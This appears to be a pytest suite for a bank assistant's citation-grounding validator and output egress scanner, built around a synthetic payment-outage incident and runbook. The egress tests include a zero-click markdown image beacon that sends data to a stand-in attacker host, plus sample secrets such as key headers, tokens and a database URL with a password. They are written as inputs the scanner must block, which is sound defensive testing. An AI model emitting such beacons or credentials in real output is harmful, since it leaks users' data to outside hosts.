"""Citation grounding and egress scanning — the validator's two halves."""

from __future__ import annotations

import pytest

from app.security.egress import EgressFinding, redact, scan_egress
from app.security.grounding import (
    check_grounding,
    extract_citations,
    insufficient_evidence_answer,
)

pytestmark = pytest.mark.security


EVIDENCE = {
    "INC-2026-0014#001": (
        "SEV2: payment failures in settlement-service. Root Cause. The settlement "
        "service opened a database connection per in-flight authorization instead "
        "of borrowing from the shared pool. Under peak load the pool ceiling of 40 "
        "was reached and further authorizations queued until they timed out."
    ),
    "INC-2026-0014#000": (
        "SEV2: payment failures in settlement-service. Summary. On 2026-03-14 the "
        "settlement service experienced elevated payment authorization failures for "
        "42 minutes. Approximately 18,000 transactions failed and an estimated "
        "4,200 customers were affected."
    ),
    "RB-PAY-001#000": (
        "Runbook: payment authorization failures. Confirm the symptom on the "
        "service dashboard and note the start time. Check recent deployments in "
        "the last four hours and roll back first if one correlates."
    ),
}


class TestCitationExtraction:
    def test_finds_citations(self) -> None:
        text = "The pool was exhausted [INC-2026-0014#001] and 18,000 failed [INC-2026-0014#000]."
        assert extract_citations(text) == ["INC-2026-0014#001", "INC-2026-0014#000"]

    def test_ignores_ordinary_brackets(self) -> None:
        assert extract_citations("See the runbook [section 4] for detail.") == []

    def test_handles_no_citations(self) -> None:
        assert extract_citations("A plain sentence.") == []


class TestFabricatedCitations:
    def test_citing_an_unretrieved_passage_fails(self) -> None:
        """The model invented a source. Unambiguous, always fatal."""
        answer = (
            "The outage was caused by connection pool exhaustion in the settlement "
            "service [INC-2099-9999#003]."
        )
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert not report.passed
        assert report.fabricated_citations == ["INC-2099-9999#003"]

    def test_repair_instructions_name_the_fabricated_ids(self) -> None:
        answer = "Something happened [FAKE-1#000]."
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert "FAKE-1#000" in report.repair_instructions()

    def test_a_valid_citation_is_not_flagged(self) -> None:
        answer = (
            "The settlement service opened a database connection per in-flight "
            "authorization instead of borrowing from the shared pool "
            "[INC-2026-0014#001]."
        )
        assert check_grounding(answer, retrieved_chunks=EVIDENCE).fabricated_citations == []


class TestNumericGrounding:
    """A wrong number is the most expensive thing this system can emit."""

    def test_a_figure_absent_from_the_evidence_fails(self) -> None:
        answer = "The incident affected 95,000 customers and lasted 42 minutes [INC-2026-0014#000]."
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert not report.passed
        assert any(i.kind == "unsupported_number" for i in report.issues)
        assert "95000" in report.issues[0].detail

    def test_a_figure_present_in_the_evidence_passes(self) -> None:
        answer = (
            "Approximately 18,000 transactions failed and an estimated 4,200 "
            "customers were affected during the settlement service incident "
            "[INC-2026-0014#000]."
        )
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert report.passed, report.issues

    def test_thousands_separators_are_normalised(self) -> None:
        """'18000' must match evidence written as '18,000'."""
        answer = (
            "Around 18000 payment authorizations failed during the settlement "
            "service incident window [INC-2026-0014#000]."
        )
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert not any(i.kind == "unsupported_number" for i in report.issues)

    def test_small_integers_are_not_treated_as_claims(self) -> None:
        """'the 3 services' should not fail grounding."""
        answer = (
            "The settlement service opened a database connection per in-flight "
            "authorization rather than borrowing from the shared pool, which "
            "exhausted it [INC-2026-0014#001]."
        )
        assert check_grounding(answer, retrieved_chunks=EVIDENCE).passed


class TestUncitedClaims:
    def test_a_factual_assertion_without_a_citation_fails(self) -> None:
        answer = (
            "The outage was caused by a misconfigured load balancer in the payments "
            "cluster during the maintenance window."
        )
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert not report.passed
        assert any(i.kind == "uncited_claim" for i in report.issues)

    @pytest.mark.parametrize(
        "sentence",
        [
            "I could not find enough supporting evidence to answer that.",
            "Based on the retrieved documents, here is what I found.",
            "No documents matching that description were available to you.",
            "In summary, the following incidents are relevant.",
        ],
    )
    def test_meta_sentences_need_no_citation(self, sentence: str) -> None:
        """Over-requiring citations makes the assistant unusable."""
        report = check_grounding(sentence, retrieved_chunks=EVIDENCE)
        assert report.passed, report.issues

    def test_headings_are_not_claims(self) -> None:
        answer = "## Recurring root causes\n\nSummary of findings:"
        assert check_grounding(answer, retrieved_chunks=EVIDENCE).passed


class TestWeakSupport:
    def test_a_citation_stapled_to_an_unrelated_claim_is_caught(self) -> None:
        answer = (
            "The marketing department reorganised its quarterly campaign calendar "
            "following the annual brand review workshop [RB-PAY-001#000]."
        )
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert not report.passed
        assert any(i.kind == "weak_support" for i in report.issues)

    def test_a_genuine_paraphrase_passes(self) -> None:
        answer = (
            "Each in-flight authorization opened its own database connection rather "
            "than borrowing from the shared pool, so the pool ceiling was reached "
            "under peak load [INC-2026-0014#001]."
        )
        assert check_grounding(answer, retrieved_chunks=EVIDENCE).passed


class TestReportShape:
    def test_a_fully_grounded_answer_passes(self) -> None:
        answer = (
            "The settlement service reached its pool ceiling because each in-flight "
            "authorization opened its own database connection [INC-2026-0014#001]. "
            "Approximately 18,000 transactions failed [INC-2026-0014#000]."
        )
        report = check_grounding(answer, retrieved_chunks=EVIDENCE)
        assert report.passed
        assert report.grounded_claims == 2
        assert report.ungrounded_claims == 0

    def test_repair_instructions_are_concrete(self) -> None:
        """'Try again' reliably produces the same answer twice."""
        answer = "The outage lasted 900 minutes [INC-2026-0014#000]."
        instructions = check_grounding(answer, retrieved_chunks=EVIDENCE).repair_instructions()
        assert "900" in instructions
        assert "remove the statement" in instructions.lower()

    def test_insufficient_evidence_does_not_confirm_what_exists(self) -> None:
        """Telling a viewer 'there is a confidential document you cannot see'
        is itself a leak."""
        message = insufficient_evidence_answer(role="viewer")
        assert "confidential" not in message.lower()
        assert "restricted" not in message.lower()


class TestEgressExfiltration:
    def test_markdown_image_beacon_blocks(self) -> None:
        """Zero-click: the client renders it and the query string leaves."""
        report = scan_egress("Here is the summary ![](https://evil.example.com/x?d=secret)")
        assert report.must_block
        assert any(f is EgressFinding.MARKDOWN_IMAGE_BEACON for f, _ in report.findings)

    def test_ordinary_prose_is_clean(self) -> None:
        report = scan_egress(
            "The settlement service pool ceiling was raised to 160 and a "
            "queue-depth alert was added."
        )
        assert report.clean

    def test_redact_defangs_an_image_without_discarding_the_answer(self) -> None:
        redacted = redact("Summary ![](https://evil.example.com/x?d=1) continues")
        assert "evil.example.com" not in redacted
        assert "Summary" in redacted and "continues" in redacted


class TestEgressSecrets:
    @pytest.mark.parametrize(
        "leak",
        [
            "-----BEGIN RSA PRIVATE KEY-----",
            "the key is sk-abcdefghijklmnopqrstuvwxyz123456",
            "token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.abcdefghijklmno",
            "connect via postgresql://atrium:hunter2@db.internal:5432/atrium",
            "credentials AKIAIOSFODNN7EXAMPLE",
        ],
    )
    def test_secret_material_blocks(self, leak: str) -> None:
        assert scan_egress(leak).must_block

    def test_a_mention_of_credentials_without_one_is_fine(self) -> None:
        report = scan_egress(
            "Rotate the client certificate before it expires; the runbook covers "
            "how to request a replacement."
        )
        assert report.clean


class TestBrandPolicy:
    def test_rate_commitment_blocks(self) -> None:
        report = scan_egress("We will offer you 7.5% on that deposit.")
        assert report.must_block
        assert any(f is EgressFinding.RATE_COMMITMENT for f, _ in report.findings)

    def test_individual_financial_advice_blocks(self) -> None:
        assert scan_egress("You should move your savings into the fixed deposit.").must_block

    def test_risk_free_characterisation_blocks(self) -> None:
        assert scan_egress("This is a guaranteed return with no downside.").must_block

    def test_undertaking_on_an_account_blocks(self) -> None:
        assert scan_egress("I have refunded the disputed transaction for you.").must_block

    def test_competitor_comparison_is_advisory_not_blocking(self) -> None:
        """Over-blocking teaches people not to use the assistant."""
        report = scan_egress("Our settlement times are better than any other bank.")
        assert not report.clean
        assert not report.must_block

    def test_describing_a_product_neutrally_is_fine(self) -> None:
        report = scan_egress(
            "The Fixed Deposit product specification defines eligibility and the "
            "applicable limits. Rates are published separately."
        )
        assert report.clean


class TestBulkReproduction:
    def test_copying_a_whole_passage_blocks(self) -> None:
        """Retrieval answers questions; it does not license reprinting."""
        passage = EVIDENCE["INC-2026-0014#001"]
        report = scan_egress(passage, source_passages=EVIDENCE)
        assert report.must_block
        assert report.max_verbatim_ratio >= 0.5

    def test_a_synthesised_answer_is_fine(self) -> None:
        answer = (
            "Two incidents share a cause. In both, connections were acquired per "
            "request rather than borrowed, so the ceiling was hit under load. The "
            "fix in each case raised the ceiling and added a saturation alert, and "
            "the follow-up work extended load testing to hold peak concurrency."
        )
        report = scan_egress(answer, source_passages=EVIDENCE)
        assert not report.must_block

    def test_short_answers_are_exempt(self) -> None:
        """A one-line quote is a citation, not an extraction attack."""
        report = scan_egress("The pool ceiling of 40 was reached.", source_passages=EVIDENCE)
        assert not report.must_block
